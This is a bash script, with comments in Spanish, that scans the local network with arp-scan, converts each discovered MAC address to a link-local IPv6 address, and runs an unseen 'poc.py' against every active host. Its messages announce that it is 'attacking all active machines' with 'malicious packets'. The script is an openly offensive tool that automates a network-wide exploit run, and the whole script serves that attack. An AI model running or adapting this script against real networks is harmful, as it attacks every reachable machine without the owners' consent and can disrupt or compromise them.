#!/bin/bash -e

#Colors
#boldText="\033[1m"
#normalText="\033[0m"
#endColor="\033[0m\e[0m"
#yellowColor="\e[0;33m\033[1m"
#redColor="\e[0;31m\033[1m"
#blueColor="\e[0;34m\033[1m"
#greenColor="\e[0;32m\033[1m"

echo -e "\033[1m[*] \e[0;34m\033[1mScanning network...\033[0m\e[0m\033[0m\n"

sudo arp-scan --interface=eth0 --localnet -plain| awk '/.*:.*:.*:.*:.*:.*/{print $2}' > diccionarioMac

echo -e "\033[1m[*] \e[0;34m\033[1mConverting MAC addresses to IPv6...\033[0m\e[0m\033[0m\n"
#convertimos direcciones MAC a IPV6 y creamos un diccionario
while read p; do
	MAC=$p
	python3 -c "from netaddr import IPAddress; \
	from netaddr.eui import EUI;mac = EUI(\"$MAC\");\
	ip = mac.ipv6(IPAddress('fe80::'));print('{ip}'.format(ip=ip))" >> diccionarioIPV6
done <diccionarioMac
rm diccionarioMac

echo -e "\033[1m[*] \e[0;34m\033[1mAttacking all active machines...\033[0m\e[0m\033[0m\n"

while read p; do
	python3 poc.py $p > /dev/null 2>&1
	echo -e "\t\e[0;32mSending malicious packets to\e[0;31m" $p
done <diccionarioIPV6

echo -e "\n\033[0m\033[1m[*] \e[0;34m\033[1mDo you wish to save an IPv6 address dictionary? \e[0;31m\033[1m(y/n)\033[0m\e[0m\033[0m\n"
read answer
case ${answer:0:1} in
    y|Y )
        mv diccionarioIPV6 $(date "+%Y.%m.%d-%H.%M.%S")_diccionarioIPV6
    ;;
    * )
        rm diccionarioIPV6
    ;;
esac